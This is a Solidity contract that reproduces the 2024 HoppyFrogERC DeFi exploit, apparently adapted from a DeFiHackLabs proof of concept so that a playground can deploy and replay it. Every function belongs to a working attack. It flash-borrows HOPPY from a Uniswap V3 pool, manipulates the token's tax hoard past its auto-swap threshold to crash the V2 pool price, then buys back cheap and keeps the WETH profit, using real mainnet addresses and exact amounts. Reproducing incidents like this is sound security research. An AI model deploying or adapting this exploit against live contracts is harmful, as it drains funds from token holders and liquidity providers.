// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-04-HoppyFrogERC).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (`contract Exploit is Test`, attacker = address(this), and the UniswapV3
// flash callback `uniswapV3FlashCallback` lives on the test itself) — there is
// no standalone attack contract to deploy. This is a faithful, self-contained
// copy of that inline attack (testExploit -> flash -> uniswapV3FlashCallback ->
// swap helpers), reproduced so the playground can deploy it and record run().
// Logic and constants are copied verbatim from test/HoppyFrogERC_exp.sol.
//
// Root cause: Hoppy's _transfer() force-dumps the CONTRACT's own accumulated
// tax-token hoard into the SAME Uniswap V2 pool mid-transaction whenever a
// sell pushes its balance over `_taxSwapThreshold`. The attacker pre-positions
// the hoard to just below the threshold with a taxed transfer, tips it over
// the threshold with a small sell, lets the forced auto-swap crash the price
// against itself, then buys back cheap HOPPY to repay the flash loan at a
// profit in WETH.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IUniswapV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract HoppyFrogDrain {
    IUniswapV3Pool private constant PAIR = IUniswapV3Pool(0xaA6f337f16E6658d9c9599c967D3126051b6c726);
    IERC20 private constant HOPPY = IERC20(0xE5c6F5fEF89B64f36BfcCb063962820136bAc42F);
    IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2Router private constant ROUTER = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    // step 0: flash-borrow the pair's entire HOPPY balance (no upfront capital);
    // uniswapV3FlashCallback below does the whole attack and must repay it.
    function run() external {
        uint256 amount = HOPPY.balanceOf(address(PAIR));
        PAIR.flash(address(this), 0, amount, "123");
    }

    function uniswapV3FlashCallback(uint256, uint256, bytes calldata) external {
        HOPPY.approve(address(ROUTER), type(uint256).max);

        // step 1: sell #1 — pushes the contract's own HOPPY hoard from
        // 4,000,000,000,000 to one wei above the auto-swap threshold.
        swapTokenToToken(address(HOPPY), address(WETH), 3_071_435_167_652_113_869_853);

        // step 2: top the hoard to exactly threshold + 1 wei with a taxed
        // self-transfer (70% transfer tax feeds the hoard on every transfer).
        HOPPY.transfer(address(HOPPY), 206_900_000_001_000_000_000);

        // step 3: sell #2 — inside the router's transferFrom, Hoppy's
        // _transfer() detects hoard > threshold and force-dumps its own
        // 4,206.9B HOPPY into the SAME pool first, crashing the price against
        // itself, before this sell executes against the now-skewed reserves.
        swapTokenToToken(address(HOPPY), address(WETH), 4_206_900_000_000_000_000_000);

        // step 4: buy back HOPPY at the crashed price and repay the flash loan.
        swapTokenToExactToken(
            7_560_087_519_329_645_008_552, address(WETH), address(HOPPY), 3_907_363_705_363_283_233
        );
        HOPPY.transfer(msg.sender, 7_560_087_519_329_645_008_552);
        // remaining WETH balance is the attacker's profit.
    }

    function swapTokenToToken(address a, address b, uint256 amount) internal {
        IERC20(a).approve(address(ROUTER), amount);
        address[] memory path = new address[](2);
        path[0] = a;
        path[1] = b;
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }

    function swapTokenToExactToken(uint256 amountOut, address a, address b, uint256 amountInMax) internal {
        IERC20(a).approve(address(ROUTER), amountInMax);
        address[] memory path = new address[](2);
        path[0] = a;
        path[1] = b;
        ROUTER.swapTokensForExactTokens(amountOut, amountInMax, path, address(this), block.timestamp + 120);
    }
}
